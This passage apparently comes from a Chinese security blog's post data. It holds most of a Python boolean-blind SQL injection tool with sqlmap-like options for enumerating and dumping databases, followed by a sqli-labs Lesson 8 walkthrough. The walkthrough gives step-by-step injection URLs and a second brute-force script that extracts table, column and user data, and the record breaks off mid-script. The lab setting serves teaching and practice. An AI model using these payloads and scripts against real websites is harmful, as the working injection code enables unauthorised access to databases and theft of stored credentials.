IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\"</span> % dbname</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_table_name</span><span class=\"params\">(url, dbname)</span>:</span></span><br><span class=\"line\">    num = get_table_num(url, dbname)</span><br><span class=\"line\">    lenth = get_all_table_len(url, num, dbname)</span><br><span class=\"line\">    tables = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        tbname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + \\</span><br><span class=\"line\">                <span class=\"string\">\" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\"</span> % dbname</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            tbname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, tbname)</span><br><span class=\"line\">        print(tbname)</span><br><span class=\"line\">        tables.append(tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d tables]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> table <span class=\"keyword\">in</span> tables:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, table)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\"</span> % (</span><br><span class=\"line\">        tbname, dbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]列数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_columns_len</span><span class=\"params\">(url, num, tbname, dbname)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\"</span> % (</span><br><span class=\"line\">            tbname, dbname)</span><br><span class=\"line\">        payload += <span class=\"string\">\"%d,1))&gt;%d--+\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"co\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'co\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取列名</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_column_name</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = get_column_num(url, tbname, dbname)</span><br><span class=\"line\">    lenth = get_all_columns_len(url, num, tbname, dbname)</span><br><span class=\"line\">    columns = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(int(len(lenth))):</span><br><span class=\"line\">        coname = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>, int(lenth[i]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">            payload = head + <span class=\"string\">\" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\"</span> % (</span><br><span class=\"line\">                tbname, dbname)</span><br><span class=\"line\">            payload += <span class=\"string\">\" %d,1),%d,1))\"</span> % (i, j)</span><br><span class=\"line\">            coname += and_method(url, payload)</span><br><span class=\"line\">            print(<span class=\"string\">'[-]当前猜解'</span>, coname)</span><br><span class=\"line\">        print(coname)</span><br><span class=\"line\">        columns.append(coname)</span><br><span class=\"line\">    print(<span class=\"string\">'Database: %s'</span> % dbname)</span><br><span class=\"line\">    print(<span class=\"string\">'Table: %s'</span> % tbname)</span><br><span class=\"line\">    print(<span class=\"string\">'[%d columns]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        print(<span class=\"string\">'[*]'</span>, column)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> columns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段数</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_num</span><span class=\"params\">(url, tbname, dbname)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = head + \\</span><br><span class=\"line\">        <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\"</span> % (dbname, tbname)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    num = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]字段数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段长度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data_len</span><span class=\"params\">(url, coname, tbname, dbname, i)</span>:</span></span><br><span class=\"line\">    payload = head + <span class=\"string\">\" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\"</span> % (</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n"},{"title":"sqli-labs-lession 8 GET单引号布尔型盲注","date":"2018-09-26T03:17:37.000Z","_content":"\n# sqli-labs-lession 8 GET单引号布尔型盲注 #\n\n## 登录界面 ##\n\n![1](/img/sql/Lesson-8/1.png)\n\n\n## 手注 ##\n\n### 注入点 ###\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1'`\n\n![4](/img/sql/Lesson-8/4.png)\n\n没有信息显示,但是页面改变了\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1'%23`\n\n![5](/img/sql/Lesson-8/5.png)\n\n判断为单引号闭合\n\n### 获取字段数 ###\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' order by 3%23`\n\n![6](/img/sql/Lesson-8/6.png)\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' order by 4%23`\n\n![7](/img/sql/Lesson-8/7.png)\n\n`order by 3`出现`You are in`,`order by 4`没有,确认字段数为3。\n\n### 获取数据库 ###\n\n#### 获取数据库名长度 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 8=length(database())%23`\n\n![8](/img/sql/Lesson-8/8.png)\n\n#### 获取数据库名 ####\n\nleft(str,n):截取字段`str`左侧的n个字符。\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 's'=left(database(),1)%23`\n\n返回正确页面,确认第一个字符是`s`\n\n![9](/img/sql/Lesson-8/9.png)\n\n\t中间都是同样的确认过程...\n\n这样手动确认,直到数据库名长度测完(十分费力...),下面是最终结果\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 'security'=left(database(),8)%23`\n\n![10](/img/sql/Lesson-8/10.png)\n\n### 获取表 ###\n\n#### 获取表数 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=(select count(table_name) from information_schema.tables where table_schema='security')%23`\n\n![11](/img/sql/Lesson-8/11.png)\n#### 获取表名 ####\n\n采用二分法。\n\n以下返回`You are in`表示`True`,无返回表示`Flase`\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 95<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n95:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 109<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n109:Flase\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 102<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n102:Flase\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 98<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n98:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 100<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n100:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 101<=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n101:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 101=ascii(substr((select table_name from information_schema.tables where table_schema=\"security\" limit 0,1),1,1))%23`\n\n![12](/img/sql/Lesson-8/12.png)\n\n确定ascii码值为101,对应的字符为`e`。\n\n接下来用二分法判断第一个表的第二个字符。\n\n最终能测试出存在下面几张表:\n\n* emails\n* referers\n* uagents\n* users\n\n### 获取列 ###\n\n#### 获取列数 ####\n\n对感兴趣的表获取列数,以users为例。\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 3=(select count(column_name) from information_schema.columns where table_name='users')%23`\n\n![13](/img/sql/Lesson-8/13.png)\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=(select count(column_name) from information_schema.columns where table_name='users')%23`\n\n![14](/img/sql/Lesson-8/14.png)\n\n根据上面两张图可以发现`users`的列数有3个。\n\n#### 获取列长度 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 2=length((select column_name from information_schema.columns where table_name=\"users\" limit 0,1))%23`\n\n![15](/img/sql/Lesson-8/15.png)\n\n说明`users`表中第一列长度为2。\n\n可以测试出总共3列长度分别为:2,8,8。\n\n#### 获取列名 ####\n\n采用二分法。\n\n以下返回`You are in`表示`True`,无返回表示`Flase`\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 95<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n95:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 109<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n109:False\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 102<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n102:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 106<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n106:False\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 104<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n104:True\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 105<=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),1,1))%23`\n\n105:True\n\n确定ascii码值为105,对应的字符为`i`。因为上面查出的列长度为2,再测试第一列的的第二个字符就可以了,还是用二分法查第二个字符。\n\n直接上结果:\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 100=ascii(substr((select column_name from information_schema.columns where table_name=\"users\" limit 0,1),2,1))%23`\n\n\n![16](/img/sql/Lesson-8/16.png)\n\nascii码值为100,对应的字符为`d`,第一列为`id`,同理可以获取到其他两列为`username`, `password`。\n\n### 获取字段 ###\n\n获取字段也和上面的大同小异了,直接给结果。\n\n也是获取字段数量->获取字段长度->获取字段名的流程。\n\n#### 获取字段数量 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 13=(select count(username) from security.users)%23`\n\n字段数是13。\n\n![17](/img/sql/Lesson-8/17.png)\n\n#### 获取字段长度 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 4=length((select username from security.users limit 0,1))%23`\n\n![18](/img/sql/Lesson-8/18.png)\n\n#### 获取字段值 ####\n\n`http://10.60.250.151/sqlilabs/Less-8/?id=1' and 68=ascii(substr((select username from security.users limit 0,1),1,1))%23`\n\n![19](/img/sql/Lesson-8/19.png)\n\nascii码值为68,对应的字符为`D`,第一个账户的第一个字母是`D`。\n\n可以发现上述过程很多都是重复的,可以写个脚本运行。\n\n### 脚本 ###\n\n用Python写的一个爆破脚本,没有用二分法,也没封装起来,力度垃圾,凑合着用。\n\n脚本运行结果:\n\n![20](/img/sql/Lesson-8/20.png)\n\n![21](/img/sql/Lesson-8/21.png)\n\n\timport requests\n\tdb_name = ''#''security'#数据库名\n\tdb_len = 0 #当前数据库长度\n\ttable_num = 0#数据库表数目\n\ttable_names = '' #数据表名\n\ttable_lenlist = [] #数据表名长度列表\n\ttable_namelist = [] #数据表名列表\n\tcolumn_numlist = [] #数据表列数\n\tcolumn_lenlist = [] #列名长度列表\n\tcolumn_namelist = [] #列名列表\n\tdump_numlist = []#字段数量列表\n\turl = 'http://10.60.250.151/sqlilabs/Less-8/?id=1'\n\tdb_payload = ''\n\ti = j = k = l = m = 0\n\t\n\tleft = 97\n\tright = 123\n\t\n\t#查询当前数据库长度\n\tprint(\"查询当前数据库长度。。。\")\n\tfor i in range(1, 21):\n\t    db_payload = \"' and %d=(select length(database()))--+\" % i\n\t    r = requests.get(url+db_payload)\n\t    if \"You are in\" in r.text:\n\t        db_len = i\n\t        break\n\tprint(\"当前数据库长度为\", db_len)\n\t\n\t#暴破当前数据库名\n\tprint(\"暴破当前数据库名...\")\n\t#数据库名长度\n\tfor i in range(1, db_len+1):\n\t    #爆破字段区域\n\t    for j in range(left, right):\n\t        db_payload = \"' and (left(database(), %d))='%s'--+\" % (i, db_name+chr(j))\n\t        #print(url+db_payload)\n\t        r = requests.get(url+db_payload)\n\t        if \"You are in\" in r.text:\n\t            db_name += chr(j)\n\t            print('当前数据库名猜解：'+db_name)\n\t            break\n\tprint(\"当前数据库名:\\n[+]\", db_name)\n\t\n\t#数据库中表数目\n\tprint(\"当前数据库表数目....\")\n\tfor i in range(1,100):\n\t    db_payload = \"' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+\" % (i, db_name)\n\t    #print(url+db_payload)\n\t    r = requests.get(url+db_payload)\n\t    if \"You are in\" in r.text:\n\t        table_num = i\n\t        break\n\tprint(\"当前数据库表数目:\", table_num)\n\t\n\t#数据库中表长度\n\tprint(\"当前数据库表名长度....\")\n\tfor i in range(table_num):\n\t    table_len = 0 #表名长度\n\t    #获取数据表长度\n\t    for j in range(1, 21):\n\t        db_payload = \"' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))--+\" % (db_name, i, j)\n\t        #print(url + db_payload)\n\t        r = requests.get(url + db_payload)\n\t        if \"You are in\" not in r.text:\n\t            table_len = j - 1\n\t            table_lenlist.append(table_len)\n\t            break\n\tprint('表名长度：', table_lenlist)\n\t\n\t#数据库表名\n\tfor i in range(table_num):\n\t    # 获取数据表名\n\t    table_names = ''\n\t    for j in range(1, table_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            db_payload = \"' and ascii(substr((select table_name from information_schema.tables where table_schema='%s' limit %d,1),%d,1))=%d--+\" % (db_name, i, j, k)\n\t            #print(url+db_payload)\n\t            r = requests.get(url+db_payload)\n\t            if \"You are in\" in r.text:\n\t                table_names += chr(k)\n\t                print(\"当前表名猜解：\", table_names)\n\t                break\n\t    table_namelist.append(table_names)\n\tprint(\"当前数据表名:\\n[+]\", table_namelist)\n\t\n\t#数据列数\n\tprint(\"各个数据表列数...\")\n\tfor i in range(table_num):\n\t    #print(i)\n\t    column_num = 0\n\t    for j in range(1, 21):\n\t        db_payload = \"' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+\" % (j, table_namelist[i])\n\t        #print(url + db_payload)\n\t        r = requests.get(url+db_payload)\n\t        if \"You are in\" in r.text:\n\t            column_num = j\n\t            #print(\"[+]\"+table_namelist[i]+\"表列数:\"+ str(column_num))\n\t            column_numlist.append(column_num)\n\t            break\n\tprint(\"[+]数据表列数\", column_numlist)\n\t\n\t#猜解列长度\n\tprint(\"猜解列长度....\")\n\tfor i in range(column_numlist[3]):\n\t    column_len = 0 #列名长度\n\t     #获取列长度\n\t    for j in range(1, 21):\n\t        db_payload = \"' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))--+\" % (i, j)\n\t        #print(url + db_payload)\n\t        r = requests.get(url + db_payload)\n\t        if \"You are in\" not in r.text:\n\t            column_len = j - 1\n\t            break\n\t    column_lenlist.append(column_len)\n\tprint('user列名长度：', column_lenlist)\n\t\n\t#猜解列名\n\tprint(\"猜解列名....\")\n\tfor i in range(column_numlist[3]):\n\t    column_names = ''\n\t    for j in range(1,column_lenlist[i]+1):\n\t        for k in range(left, right):\n\t            db_payload = \"' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1))=%d--+\" % (\n\t                i, j, k)\n\t            #print(url + db_payload)\n\t            r = requests.get(url + db_payload)\n\t            if \"You are in\" in r.text:\n\t                column_names += chr(k)\n\t                print(\"当前表名猜解：\", column_names)\n\t                break\n\t    column_namelist.append(column_names)\n\tprint(\"users列名:\\n[+]\", column_namelist)\n\t\n\t#爆破字段\n\tprint(\"爆破字段....\")\n\tprint('开始爆破字段数量：')\n\tfor column in column_namelist[0:]:\n\t    #print(column, '：')\n\t    dump_num = 0\n\t    #爆破各个字段数量\n\t    for i in range(30):\n\t        db_payload = \"' and %d=(select count(%s) from %s.%s)--+\" % (i, column, db_name, table_namelist[-1])\n\t        #print(url+db_payload)\n\t        r = requests.get(url+db_payload)\n\t        if \"You are in\" in r.text:\n\t            dump_num = i\n\t            